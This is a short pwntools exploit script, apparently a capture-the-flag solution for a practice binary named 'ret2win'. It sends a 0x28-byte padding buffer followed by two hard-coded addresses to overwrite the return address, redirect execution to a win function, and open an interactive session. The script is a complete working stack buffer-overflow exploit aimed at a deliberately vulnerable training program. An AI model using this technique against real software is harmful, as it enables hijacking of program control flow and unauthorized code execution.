from pwn import *

conn = process('./ret2win')
#conn = gdb.debug('./ret2win')

conn.sendafter('> ', b'a' * 0x28 + p64(0x4006e7) + p64(0x400756))
conn.interactive()